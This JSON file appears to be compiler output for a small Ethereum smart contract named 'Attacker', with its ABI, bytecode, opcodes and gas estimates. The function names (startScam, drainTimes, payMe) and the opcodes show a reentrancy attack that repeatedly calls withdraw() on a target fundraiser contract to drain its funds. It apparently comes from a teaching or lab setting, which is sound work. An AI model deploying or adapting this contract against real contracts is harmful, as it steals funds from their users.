{
	"": {
		"Attacker": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "startScam",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "getFunds",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "nonpayable"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "fundraiserAddress",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "drainTimes",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "payMe",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"payable": true,
					"type": "fallback",
					"stateMutability": "payable"
				}
			],
			"evm": {
				"bytecode": {
					"object": "6060604052600060015534610000575b61023c8061001d6000396000f360606040523615610065576000357c0100000000000000000000000000000000000000000000000000000000900480633f91e3781461008c5780634d9b37351461009657806365687008146100b9578063c4f9a444146100f2578063d997ccb314610115575b61008a5b60036001541015610087576001600081548092919060010191905055505b5b565b005b61009461011f565b005b34610000576100a36101ab565b6040518082815260200191505060405180910390f35b34610000576100c66101cb565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34610000576100ff6101f1565b6040518082815260200191505060405180910390f35b61011d6101f7565b005b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b604051817c0100000000000000000000000000000000000000000000000000000000028152600401809050600060405180830381600087803b156100005760325a03f115610000575050505b565b60003073ffffffffffffffffffffffffffffffffffffffff163190505b90565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba345050505b56",
					"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x1 SSTORE CALLVALUE PUSH2 0x0 JUMPI JUMPDEST PUSH2 0x23C DUP1 PUSH2 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN PUSH1 0x60 PUSH1 0x40 MSTORE CALLDATASIZE ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV DUP1 PUSH4 0x3F91E378 EQ PUSH2 0x8C JUMPI DUP1 PUSH4 0x4D9B3735 EQ PUSH2 0x96 JUMPI DUP1 PUSH4 0x65687008 EQ PUSH2 0xB9 JUMPI DUP1 PUSH4 0xC4F9A444 EQ PUSH2 0xF2 JUMPI DUP1 PUSH4 0xD997CCB3 EQ PUSH2 0x115 JUMPI JUMPDEST PUSH2 0x8A JUMPDEST PUSH1 0x3 PUSH1 0x1 SLOAD LT ISZERO PUSH2 0x87 JUMPI PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP JUMPDEST JUMPDEST JUMP JUMPDEST STOP JUMPDEST PUSH2 0x94 PUSH2 0x11F JUMP JUMPDEST STOP JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0xA3 PUSH2 0x1AB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0xC6 PUSH2 0x1CB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0xFF PUSH2 0x1F1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x11D PUSH2 0x1F7 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO PUSH2 0x0 JUMPI PUSH1 0x32 GAS SUB CALL ISZERO PUSH2 0x0 JUMPI POP POP POP JUMPDEST JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD7BB99BA CALLVALUE POP POP POP JUMPDEST JUMP ",
					"linkReferences": {}
				},
				"methodIdentifiers": {
					"drainTimes()": "c4f9a444",
					"fundraiserAddress()": "65687008",
					"getFunds()": "4d9b3735",
					"payMe()": "d997ccb3",
					"startScam()": "3f91e378"
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "114400",
						"executionCost": "5157"
					},
					"internal": {
						"()": "20173"
					},
					"external": {
						"": "20341",
						"drainTimes()": "20214",
						"fundraiserAddress()": "20214",
						"getFunds()": "20214",
						"payMe()": "20214",
						"startScam()": "infinite"
					}
				}
			}
		}
	}
}